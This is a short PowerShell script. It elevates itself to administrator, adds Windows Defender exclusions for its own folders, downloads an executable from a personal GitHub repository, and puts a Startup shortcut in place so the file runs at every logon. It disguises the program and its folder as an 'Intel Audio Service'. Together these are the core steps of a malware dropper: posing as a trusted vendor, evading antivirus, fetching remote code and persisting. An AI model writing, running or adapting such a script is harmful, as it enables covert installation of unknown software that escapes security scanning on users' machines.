# Clear-Host
# Self-elevate the script if required
if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
      if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
       $CommandLine = "-File "" + $MyInvocation.MyCommand.Path + "" " + $MyInvocation.UnboundArguments
       Start-Process -FilePath PowerShell.exe -Verb Runas -ArgumentList $CommandLine
      #  Exit
      }
     }
     
     # Remainder of script here
      $WScriptShell = New-Object -ComObject WScript.Shell
      $FolderPath = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
      $ShortcutFile = "$FolderPath\Intel Audio Service.lnk"
      $TargetPath = "$env:USERPROFILE\AppData\Roaming\Intel Corporation\Intel Audio Service"
      $TargetFile = "$TargetPath\Intel Audio Service.exe"
      
      If(!(Test-Path $FolderPath)) {
            New-Item -ItemType Directory -Force -Path $FolderPath
            Write-Output "Shortcut folder created"
      }

      if (!(test-path $TargetPath)) {
            New-Item -ItemType Directory -Force -Path $TargetPath
            Write-Output "Target folder created"
            Add-MpPreference -ExclusionPath $FolderPath
            Add-MpPreference -ExclusionPath $TargetPath
            Write-Output "Exclusions added"
      }

      if (!(test-path $TargetFile)) {
            Invoke-WebRequest -Uri "https://github.com/B95segal/intelaudioservice/blob/main/dist/Intel Audio Service.exe" -OutFile $TargetFile
            Write-Output "File downloaded"
      }


      $Shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
      $Shortcut.TargetPath = $TargetFile
      $Shortcut.WorkingDirectory = $TargetPath
      $Shortcut.IconLocation = "$TargetPath\Intel Audio Service.exe,0"
      $Shortcut.Save()
      Write-Output "Shortcut created"
      

      # Restart-Computer -Force
